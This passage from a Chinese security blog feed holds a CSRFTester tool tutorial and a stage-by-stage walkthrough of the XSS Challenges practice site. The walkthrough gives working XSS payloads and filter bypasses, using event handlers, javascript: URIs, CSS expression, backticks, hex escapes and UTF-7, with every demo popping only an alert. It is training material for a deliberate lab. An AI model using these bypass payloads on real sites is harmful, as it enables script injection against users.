        <content type="html"><![CDATA[<h2 id="CSRFTester介绍"><a href="#CSRFTester介绍" class="headerlink" title="CSRFTester介绍"></a>CSRFTester介绍</h2><p>CSRFTester是一款针对CSRF漏洞的测试工具</p><p><strong>工作原理</strong></p><p>它使用代理抓取我们在浏览器中访问过的所有的链接及表单信息，通过CSRFTester修改相应表单信息，重新提交，相当于伪造了一次客户端请求，如果测试的请求成功，被服务器接受，则证明存在CSRF漏洞。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>1.打开浏览器，设置代理为127.0.0.1:8008，因为CSRFTester通过本地8008端口来进行监听</p><p>2.在需要测试的地方请求，在CSRFTester可成功监听分析</p><p>3.生成csrf poc，点击生成的html链接，检验成功性</p><p><strong>实战</strong></p><p>1.打开目标测试点，点击表单提交数据</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202192407.png"></p><p>2.在点击表单提交之前再开启start recording防止其他参数影响，可以看见后面有些流量是带了数据的，将这些数据进行修改成你想构想的数据</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202192422.png"></p><p>3.点击generate HTML，生成index.html，再讲index.html中，红色区域的form表单删去，再用同一浏览器访问，如果返回true则成功添加一位用户</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202192104.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210202192009.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://luckyzmj.cn/posts/a1b686d3.html">http://luckyzmj.cn/posts/a1b686d3.html</a></li><li><a href="https://blog.csdn.net/shimengran107/article/details/70238669?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/shimengran107/article/details/70238669?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-3&amp;spm=1001.2101.3001.4242</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
            <tag> web攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS Challenges</title>
      <link href="post/17b23cbe.html"/>
      <url>post/17b23cbe.html</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-Challenges"><a href="#XSS-Challenges" class="headerlink" title="XSS  Challenges"></a>XSS  Challenges</h1><h3 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage #1"></a>Stage #1</h3><p><a href="http://xss-quiz.int21h.jp/?sid=e03ee5801343796c467d726953fb2a6b49f58006">http://xss-quiz.int21h.jp/?sid=e03ee5801343796c467d726953fb2a6b49f58006</a></p><ul><li><p>观察变量</p><ul><li><p>在search框中输入一个普通变量观察周围变量环境</p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141348.png" alt="image-20210115101332788" style="zoom: 67%;" /></li><li><p>由上图可见当我们任意输入aaa之后，审核元素可以发现输入的值写入到<b></b>标签中</p></li></ul></li><li><p>构造payload</p><ul><li><p>由于是直接写入到b标签的内容里面，所以可以看出并没有对输入做任何过滤限制，于是可以直接构造js语句对其进行攻击</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;<span class="string">&quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</span>&lt;/b&gt;</span><br></pre></td></tr></table></figure></li><li><p>我们这样做的目的只有一个，我们所提交的js参数要与周围环境和谐，浏览器才会对整个页面从新渲染，从而执行我们所提交的JS代码</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141502.png"></p></li></ul></li></ul><h3 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage #2"></a>Stage #2</h3><p><a href="http://xss-quiz.int21h.jp/stage2.php?sid=5068ea10a358df7653be0f031b52e6f43b6207cf">http://xss-quiz.int21h.jp/stage2.php?sid=5068ea10a358df7653be0f031b52e6f43b6207cf</a></p><ul><li><p>观察变量</p><ul><li><p>在search同样输入普通变量aaa观察周围环境变量</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141526.png"></p></li><li><p>可以看见这次我们输入的值，被传入了value值中，于是可以思考我们的js代码在input标签中，那么是否可以提前将input标签闭合，闭合后再传值作为内容部分，从而执行我们的JS代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;p1&quot;</span> size=<span class="string">&quot;50&quot;</span> value=<span class="string">&quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>构造payload</p><ul><li><p>经过上面的分析我们可以构造js语句了（其核心思路就为根据提交和返回的值得关系，从而判断出提交规则，绕过）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141510.png"></p></li></ul></li></ul><h3 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage #3"></a>Stage #3</h3><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=ee0a5108164b4daae0a2afaeef662c7adf1c59e4">http://xss-quiz.int21h.jp/stage-3.php?sid=ee0a5108164b4daae0a2afaeef662c7adf1c59e4</a></p><ul><li><p>观察变量</p><ul><li><p>这次当我们输入变量aaa之后，观察发现与stage #1类似，但事情估计不会那么简单</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141548.png"></p></li><li><p>还是尝试着构造了一个payload试了一下,果然不行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>失败原因：字符输入时被转义，可以看下关于PHP  htmlspecialchars（）的介绍</p></li><li><p>继续审核元素，发现后面有一个country也在b标签内，但在页面无法修改，改用抓包查看</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141608.png"></p></li></ul><p>​        发现请求的参数中有p2，从前面的审核元素中可以看见是属于country的，于是可以试着从p2入手</p><ul><li><p>构造payload</p><ul><li><p>将p2中的值修改为<script>alert(document.domain)</script>放包</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141634.png"></p><p>成功执行</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141645.png"></p></li></ul></li></ul><h3 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage  #4"></a>Stage  #4</h3><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=f5ecdd2b1ac189b0313a0395bba13c15ec23df4c">http://xss-quiz.int21h.jp/stage_4.php?sid=f5ecdd2b1ac189b0313a0395bba13c15ec23df4c</a></p><ul><li><p>观察变量</p><ul><li><p>同样输入一个普通常量aaa观察一下</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141654.png"></p><p>发现这不就是上一关吗，于是按照正常逻辑，就不在此页面演示了，直接抓包改值</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119141729.png"></p><p>还是一样的直接修改p2的值，但是这次发现不行</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142012.png"></p><p>想一想也是，毕竟是上升了一关了，于是发现在请求处符出现了一个p3，但这个p3=hackme,这个值并未在页面中出现，接着尝试修改了p3，发现还是不行，但此处通过抓包信息无法得出什么了，于是继续回到输入处，审核元素</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142040.png"></p><p>发现修改p3的值，在页面处返回的信息中看见，我的js脚本是在input标签中，做到这里感觉不是跟stage #2一样吗，于是构造payload</p></li></ul></li><li><p>构造payload</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142052.png"></p></li></ul><p>​       成功实现</p><p>​      <img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142111.png">3</p><h3 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage #5"></a>Stage #5</h3><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=3b204b3e8efd497a0a085f531ed716e828372d27">http://xss-quiz.int21h.jp/stage--5.php?sid=3b204b3e8efd497a0a085f531ed716e828372d27</a></p><ul><li><p>观察变量</p><ul><li>同样输入一个普通观察元素</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142120.png"></p><p>发现是在input标签中，跟第二关一样吗？，试一试</p><p>发现报错，点开查看，发现在value值后面输入的语句不完整，被自动裁掉了一半，发现前面有一个maxlength元素限制了长度</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142132.png"></p></li><li><p>构造payload</p><p>修改maxlength的值，然后再构造闭合input标签的js语句</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142146.png"></p><p>成功执行</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142156.png"></p></li></ul><h3 id="Stage-6"><a href="#Stage-6" class="headerlink" title="Stage #6"></a>Stage #6</h3><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=95f8ced6ca36ff11e4df12eec643be78224705fa">http://xss-quiz.int21h.jp/stage-no6.php?sid=95f8ced6ca36ff11e4df12eec643be78224705fa</a></p><ul><li><p>观察元素</p><ul><li><p>还是一样的审核下元素，发现又是一样的，事情想也想得到不会这么简单，还是执行以下js语句看下怎么回事</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142203.png"></p></li><li><p>插入js语句后发现字符转义了，&lt;&gt;被HTML特殊内容所代替</p></li></ul></li></ul><pre><code>&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142356.png&quot; alt=&quot;image-20210115161703461&quot; style=&quot;zoom:200%;&quot; /&gt;</code></pre><p>​               看到这，看了下提示event handler attributes（事件处理程序属性 ），提示我们要用事件属性来处理了</p><ul><li><p>构造payload</p><p>根据提示，构造了如下js语句，具体可以看下onmouseover事件的用法，onclick等还有许多类似的用法</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142429.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;&quot;alert(document.domain)</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142450.png" alt="image-20210115162957456"  /></li></ul><h3 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage #7"></a>Stage #7</h3><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=0a0cc8b0b0c12ee8cd0590ce19865f165b628ad9">http://xss-quiz.int21h.jp/stage07.php?sid=0a0cc8b0b0c12ee8cd0590ce19865f165b628ad9</a></p><ul><li><p>观察元素</p><ul><li><p>输入一个普通元素看下elements,发现跟stage #2一样的情况，但有了stage #6前车之鉴，还是输入一下js语句，给他一个面子</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142506.png"></p><p>执行语句之后，发现并未如同之前一样做什么转义，但发现我们输入的内容颜色(“ &lt; &gt;)好像不跟周围环境颜色相同，那么就只有可能我们传入的值成为了内容的一部分，也就是我们的”并未对value元素闭合，从而导致input标签也未被闭合，（“）发生了转义，我们传入的值未执行。</p></li></ul></li><li><p>构造payload</p><ul><li><p>有了上面的分析，基本可以有了一个方向，那就是让“不被转义，要让他执行，于是用对“进行utf编码一下，在放进去执行看看，发现还是没用</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142515.png"></p><p>“还是被转义了,又尝试了下url编码绕过还是不行，最后百度了一下，发现可以通过可通过双引号后面加空格分隔属性，浏览器会自动补齐“,从而执行后面的语句，但在空格之前得输入一个值，然后空格输入，不然还是被当做是value中的传入,后面又发现同样对&lt;&gt;和/做了转义，于是还是参考stage #6的思路（不知道描述是否正确这一题）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> onclick=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142531.png"></p></li></ul></li></ul><h3 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage #8"></a>Stage #8</h3><p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=8e5137095794b899dbc36606cebfc1abc73498b2">http://xss-quiz.int21h.jp/stage008.php?sid=8e5137095794b899dbc36606cebfc1abc73498b2</a></p><ul><li><p>观察变量</p><ul><li><p>还是一样随机输入一个值，看看周围环境变量</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142559.png"></p><p>发现是在一个a标签中，并且输入的值会显示在href和外面的内容中</p><p>那么就要在其中构造一个链接并弹出弹框来</p></li></ul></li><li><p>构造payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><p>javascript: 是一个伪协议</p><p>javascript:是表示在触发<a>默认动作时，执行一段JavaScript代码，而 javascript:; 表示什么都不执行，这样点击<a>时就没有任何反应。</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142616.png"></p></li></ul><p>​      成功执行</p><p>​       <img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142639.png"></p><h3 id="Stage-9"><a href="#Stage-9" class="headerlink" title="Stage #9"></a>Stage #9</h3><p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=b96b4ca3bcd27679e5ab65d3a8200edf3f212d4e">http://xss-quiz.int21h.jp/stage_09.php?sid=b96b4ca3bcd27679e5ab65d3a8200edf3f212d4e</a></p><ul><li><p>观察变量</p><ul><li><p>同样输入随机变量，观察下周围的环境变量</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142653.png"></p><p>发现还是和之前一样，构造一个js语句试下，发现不行，语句没有闭合执行</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142722.png"></p><p>于是用stage 7之前用到的payload试下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 onclick&#x3D;alert(document.domain)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142746.png"></p><p>发现没能通过，可直接看HTML的信息，发现和stage #7一样，一度怀疑自己前面错了，但后面想了下，对于xss双引号绕过，有很多不同的绕过放式，于是又试了下url编码、Unicode编码、HTML编码还是不对，于是又转到审核元素处，发现在input p1输入框下还有一个输入框，但页面没有显示，于是抓包看了下，发现是charset属性，又查了下euc-jp,是一种日文编码，于是应该是该文档的字符编码为euc-jp</p></li></ul></li><li><p>payload构造</p><p>上面查看出了编码类型，但还是没找到太多关于euc-jp的利用，本想着构造一个反编码，奈何太菜，没实现</p><p>于是放弃了此题，后面查看了提示是utf-7，于是可能是跟utf-7有关，但还是没能实现。看了文章，一些大佬的笔记，大致如下</p><p>思路：</p><p>1.将payload构造成UTF-7编码</p><p>然后抓包改为如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1&#x3D;1%2bACI- οnmοuseοver&#x3D;%2bACI-alert(document.domain)%2bADsAIg- x&#x3D;%2bACI-&amp;charset&#x3D;UTF-7</span><br></pre></td></tr></table></figure><p>2.浏览器适应UTF-7，这里可以尝试一下，IEtester、ie7浏览器</p><p>具体做法就没尝试了，后面有时间在更新一下</p></li></ul><h3 id="Stage-10"><a href="#Stage-10" class="headerlink" title="Stage #10"></a>Stage #10</h3><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=9cead88514d9b964cca7ade5a16b96b883f9de9b">http://xss-quiz.int21h.jp/stage00010.php?sid=9cead88514d9b964cca7ade5a16b96b883f9de9b</a></p><ul><li><p>观察变量</p><ul><li><p>还是同样的套路，输入一个普通常量，观察下周围的变量</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142806.png"></p><p>不出意外还是自我感觉良好，和之前一样一步一步来吧</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142822.png"></p><p>发现内容溢出了，而且还找不到domain不见了，于是双写domain尝试了下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(document.domaindomain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>发现还是不行，那估计domain关键字被过滤了，试了下重写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119142841.png"></p></li></ul></li></ul><h3 id="Stage-11"><a href="#Stage-11" class="headerlink" title="Stage #11"></a>Stage #11</h3><ul><li>网址已无法打开</li></ul><h3 id="Stage-12"><a href="#Stage-12" class="headerlink" title="Stage #12"></a>Stage #12</h3><p><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=491f61be10e2e4f1f9dc913f1bef5102ee7dd635">http://xss-quiz.int21h.jp/stage_no012.php?sid=491f61be10e2e4f1f9dc913f1bef5102ee7dd635</a></p><ul><li><p>观察</p><ul><li>还是老套路，先观察一番再说，看看周围环境变量</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119143925.png"></p><p>还是老惯例，基本不能闭合value来闭合表签绕过</p><p>但没办法，还是得输入进去，再看看具体情况</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200455.png"></p><p>发现过滤了我们输入的”、&lt;&gt;</p><p>那么既然这样我们在stage #7中有一个类似的题，那么就用上面的playload去试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> onclick=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200506.png"></p><p>发现并没有类似于之前的Stage #7，利用空格分隔了属性</p></li><li><p>构造payload</p><ul><li><p>那么我们这个地方就只有一个目标将value属性闭合，但是又无法直接利用”，”是被直接过滤的，也就是应该无法利用编码之类的，想起了之前看xss绕过的一篇文章时，说道了可利用``代替”，去进行闭合，但是这是<strong>ie浏览器特性</strong></p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200521.png"></p><p>成功</p></li></ul></li></ul><h3 id="Stage-13"><a href="#Stage-13" class="headerlink" title="Stage #13"></a>Stage #13</h3><p><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=39d578dbf7595d696ce798c5cab005b9fd12bf12">http://xss-quiz.int21h.jp/stage13_0.php?sid=39d578dbf7595d696ce798c5cab005b9fd12bf12</a></p><ul><li><p>观察</p><ul><li><p>还没开始输入就直接有个backgroud-color元素在里面</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200537.png"></p><p>还是一样的就闭合value呗，老欺骗了</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200545.png"></p><p>当执行常规js语句后，发现并没有起作用，可以看见颜色并没有发生变换，估计也是被过滤了，但上面有做过一个类似的题stage #7也是“被过滤，没起作用,构造了试了一下。还是没起作用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:salmon onclick=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><p>做到这其实也有点类似于上一题了，直接在ie浏览器上代替，但是估计还是不行</p><p>这不是没啥变换吗，题都升级了，总不可能绕过放式一样撒</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200555.png"></p><p>果不其然，不得行，``失效了，估计在后端对此做了防御，有点无从下手了，看了下提示“style attribute”样式属性，百度了一下style xss,好像是带样式属性的xss攻击（并不是很清楚css特性），发现是利用css特性设置backgroud:url和javascript伪协议来做，难怪不得一进入13关就有background元素，对于这方面并不是很清楚吗，就直接利用payload了，但是值得注意的是必须要在低版本的ie浏览器下，才能执行，ie10以下，测试了ietester(需要安装f2插件)通过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background:url(javascript:alert(<span class="string">&#x27;xss&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200605.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200642.png"></p></li></ul></li></ul><h3 id="Stage-14"><a href="#Stage-14" class="headerlink" title="Stage #14"></a>Stage #14</h3><p><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=452eceb5376523131d1711cb7b21e5db0de6130d">http://xss-quiz.int21h.jp/stage-_-14.php?sid=452eceb5376523131d1711cb7b21e5db0de6130d</a></p><ul><li><p>观察</p><ul><li><p>还是如同13关一样一进去就是backgroud·····，那么就直接用13关的，先去IEtester，用了下13关的方法</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200707.png"></p><p>可以发现url/script/eval/expression都被替换成xxx了，可以采用注释符打断</p></li></ul></li><li><p>构造payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expres<span class="comment">/**/</span>sion(<span class="keyword">if</span>(!<span class="built_in">window</span>.x)&#123;alert(<span class="built_in">document</span>.domain);<span class="built_in">window</span>.x=<span class="number">1</span>;&#125;)</span><br></pre></td></tr></table></figure><p>有关于css expression的介绍可以看些这篇文章</p></li></ul><p>  <img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200836.png"></p><h3 id="Stage-15"><a href="#Stage-15" class="headerlink" title="Stage #15"></a>Stage #15</h3><p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=1812d76c0cb38953e97626afc6cfca6bea4f9215">http://xss-quiz.int21h.jp/stage__15.php?sid=1812d76c0cb38953e97626afc6cfca6bea4f9215</a></p><ul><li><p>观察</p><ul><li><p>还是一样提交普通变量看下外围环境</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200856.png"></p></li><li><p>提交普通变量看下外围环境</p><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200923.png"></p><p>发现第一处和第三处地方没变，第二处的地方发生了转义，HTML编码</p><p>那么试下以下js语句，看下第一处和第三处</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200941.png"></p><p>这次得到的信息要多一点发现”也被转义了，除此外在另外两处中，”也被实体化了</p><p>也就是我们不能提交”、&lt;&gt;，那么用16进制提交试一下呢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;   3c    </span><br><span class="line">&gt;   3e</span><br><span class="line">\x3cscript\3ealert(<span class="built_in">document</span>.domain)\x3c/script\x3e</span><br></pre></td></tr></table></figure><p>​               <img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200941.png"></p><p>发现\被过滤了，再添加一个试一试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x3cscript\\3ealert(<span class="built_in">document</span>.domain)\\x3c/script\\x3e</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210119200953.png"></p><p>成功</p><p>这里主要利用了浏览器的特性，会自动转换16进制</p></li></ul></li></ul><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>​    由于后续几关都涉及到浏览器的版本问题就没在继续闯关了</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="一、主要思路："><a href="#一、主要思路：" class="headerlink" title="一、主要思路："></a>一、主要思路：</h4><p>1.看外围环境<input type="text" name='xx' value="xxx"></p><p>2.提交普通变量观察周围环境 aaa</p><p>3.提交普通JS探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>4.观察周围环境变量，看下返回参数</p><p>5.思考是否有转义字符，过滤，字符长度等</p><p>6.测试</p><p>7.构造payload</p><h4 id="二、1-15关主要绕过放式"><a href="#二、1-15关主要绕过放式" class="headerlink" title="二、1-15关主要绕过放式"></a>二、1-15关主要绕过放式</h4><p>1.1-5关都是很基础的，只需要闭合标签就行或者寻找其他攻击点，基本没过滤，转义等，直接构造语句实现</p><p>2.第6关&lt;&gt;被转义利用事件属性完成 onmouseover、onclick等</p><p>3.第七关大体跟第6关一样，只不过”被实体化了，最后利用了双引号后面加空格分隔属性，浏览器自动补齐双引号完成绕过</p><p>4.第8关主要利用了JavaScript伪协议完成了绕过</p><p>5.第10关主要利用了重写绕过</p><p>6.第12关利用ie浏览器的特性``代替”绕过</p><p>7.第13关利用了css特性和javascript伪协议绕过，行内样式属性xss攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background:url(javascript:alert(&#39;xss&#39;))</span><br></pre></td></tr></table></figure><p>8.第14关主要利用了css expression加注释符打断绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expres&#x2F;**&#x2F;sion(if(!window.x)&#123;alert(document.domain);window.x&#x3D;1;&#125;)</span><br></pre></td></tr></table></figure><p>9.第15关主要利用了浏览器特性-自动解码16进制绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x3cscript\3ealert(document.domain)\x3c&#x2F;script\x3e</span><br></pre></td></tr></table></figure><h4 id="三、知识点"><a href="#三、知识点" class="headerlink" title="三、知识点"></a>三、知识点</h4><p>1.JS三种弹窗</p><ol><li><p>alert()方法/警告框alert()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>confirm()方法/确认框confirm()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(document.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>prompt()方法/提示框prompt()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(&quot;文本&quot;,&quot;默认值&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>SVG与XSS</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure><p>3.鼠标事件</p><p>​    因为上面有几关用到了鼠标事件，于是罗列了几个出来</p><pre><code>   onclick： 鼠标按下后松开才会触发   ondblclick：双击   onmousedown:按下   鼠标按下即可触发   onmouseenter：指针移动到元素上时触发   onmouseleave：指针移出元素时触发   onmousemove：指针进入后，在元素范围内，只要移动就会一直触发   onmouseover：移进去触发   onmouseout：移出时触发   onmouseup:鼠标进去后，按键松开时，触发一次</code></pre><p>4.JavaScript伪协议</p><p> 将JavaScript代码放在伪协议说明符javascript:后的url中，这样当加载这个url时，就会执行这个url中包含的JavaScript代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web攻击 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="post/d12d6355.html"/>
      <url>post/d12d6355.html</url>
      
